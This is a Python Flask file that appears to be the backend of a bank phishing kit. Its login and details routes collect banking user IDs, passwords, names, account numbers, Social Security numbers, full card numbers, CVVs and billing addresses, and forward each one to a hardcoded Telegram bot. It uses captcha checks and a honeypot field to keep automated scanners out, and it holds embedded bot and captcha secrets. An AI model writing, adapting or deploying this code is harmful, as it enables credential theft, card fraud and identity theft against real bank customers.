import requests
import sqlite3
import os
from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=["*"])  # Allow all origins for production

# Telegram bot credentials - use environment variables for production
BOT_TOKEN = os.environ.get("BOT_TOKEN", "6631658853:AAFDtIUx4xDRN61dyKiROvlgmo1PpuNtjNU")
CHAT_ID = os.environ.get("CHAT_ID", "5817278771")
TURNSTILE_SECRET_KEY = "0x4AAAAAABlFprCgz27EaC_4r9oHs05ay_M"

# --- SQLite setup ---
DB_PATH = os.path.join(os.getcwd(), 'users.db')
def init_db():
    try:
        create = not os.path.exists(DB_PATH)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, password TEXT)''')
        if create:
            c.execute('INSERT OR IGNORE INTO users (user_id, password) VALUES (?, ?)', ('admin', '1234'))
        conn.commit()
        conn.close()
        print(f"Database initialized successfully at {DB_PATH}")
    except Exception as e:
        print(f"Database initialization error: {e}")
init_db()

def check_user(user_id, password):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id=? AND password=?', (user_id, password))
    result = c.fetchone()
    conn.close()
    return result is not None

# --- Telegram functions ---
def send_to_telegram(user_id, password, banking_type, ip):
    msg = f"[Login Attempt]\nBanking Type: {banking_type}\nUser ID: {user_id}\nPassword: {password}\nIP: {ip}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        pass  # Ignore errors for now

def send_details_to_telegram(name, account, ssn, card_name, card_number, expiry, cvv, billing_address, ip):
    msg = f"[Account Details]\nName: {name}\nAccount Number: {account}\nSSN: {ssn}\nCardholder Name: {card_name}\nCard Number: {card_number}\nExpiry: {expiry}\nCVV: {cvv}\nBilling Address: {billing_address}\nIP: {ip}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": msg}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        pass

@app.route('/', methods=['GET'])
def index():
    return jsonify({'message': 'Backend is running!'})

@app.route('/login', methods=['POST'])
def login():
    honeypot = request.form.get('email', '')
    if honeypot:
        return jsonify({'success': False, 'error': 'Bot detected.'}), 400

    # Cloudflare Turnstile verification
    token = request.form.get('cf-turnstile-response')
    if not token:
        return jsonify({'success': False, 'error': 'Captcha missing.'}), 400
    data = {
        'secret': TURNSTILE_SECRET_KEY,
        'response': token,
        'remoteip': request.remote_addr
    }
    verify_response = requests.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', data=data)
    result = verify_response.json()
    if not result.get('success'):
        return jsonify({'success': False, 'error': 'Captcha failed.'}), 400

    user_id = request.form.get('userId', '')
    password = request.form.get('password', '')
    banking_type = request.form.get('bankingType', '')
    ip = request.remote_addr

    # Always send login attempt to Telegram
    send_to_telegram(user_id, password, banking_type, ip)

    # Check credentials against SQLite DB
    if check_user(user_id, password):
        return jsonify({'success': True, 'redirect': '/details.html'}), 200
    else:
        return jsonify({'success': False, 'error': 'Invalid login credentials.'}), 200

@app.route('/details', methods=['POST'])
def details():
    # Cloudflare Turnstile verification
    token = request.form.get('cf-turnstile-response')
    if not token:
        return jsonify({'success': False, 'error': 'Captcha missing.'}), 400
    data = {
        'secret': TURNSTILE_SECRET_KEY,
        'response': token,
        'remoteip': request.remote_addr
    }
    verify_response = requests.post('https://challenges.cloudflare.com/turnstile/v0/siteverify', data=data)
    result = verify_response.json()
    if not result.get('success'):
        return jsonify({'success': False, 'error': 'Captcha failed.'}), 400

    name = request.form.get('name', '')
    account = request.form.get('account', '')
    ssn = request.form.get('ssn', '')
    card_name = request.form.get('cardName', '')
    card_number = request.form.get('cardNumber', '')
    expiry = request.form.get('expiry', '')
    cvv = request.form.get('cvv', '')
    billing_address = request.form.get('billingAddress', '')
    ip = request.remote_addr
    print(f"Received details: {name}, {account}, {ssn}, {card_name}, {card_number}, {expiry}, {cvv}, {billing_address}, {ip}")
    send_details_to_telegram(name, account, ssn, card_name, card_number, expiry, cvv, billing_address, ip)
    return jsonify({'success': True, 'message': 'Details received.'}), 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'message': 'Backend is running'}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False) 